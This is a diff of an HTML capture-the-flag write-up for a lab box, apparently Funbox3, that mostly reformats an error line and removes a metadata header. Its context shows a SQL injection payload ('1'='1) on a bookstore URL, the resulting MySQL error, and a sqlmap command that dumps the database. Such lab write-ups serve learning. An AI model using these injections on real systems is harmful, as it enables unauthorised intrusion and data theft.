@@ -82,7 +82,8 @@ Oscar Wilde (*1854 - †1900)
 </li>
 </ul>
 <p><code>http://192.168.56.118/store/book.php?bookisbn=978-0-321-94786-4 or '1'='1</code></p>
-<p><code>Can't retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'='1'' at line 1</code></p>
+<p><code>Can't retrieve data You have an error in your SQL syntax; 
+check the manual that corresponds to your MySQL server version for the right syntax to use near '1'='1'' at line 1</code></p>
 <h4>Using sqlmap to dump database:</h4>
 <pre><code>crazyeights@es-base:~$ sqlmap -u http://192.168.56.118/store/book.php?bookisbn=978-0-321-94786-4 --dump
 [SNIP]
@@ -239,5 +240,4 @@ root@funbox3:~#
 <li>this one was awesome. just the right level of easy to you feel like a boss while doing it. 10/10</li>
 </ul>
 <p>FIN.</p>
-<h1>Note <!-- Metadata: type: Note; created: 2020-10-12 20:51:21; reads: 3; read: 2020-10-12 20:51:54; revision: 1; modified: 2020-10-12 20:51:21; --></h1>
 </body></html>
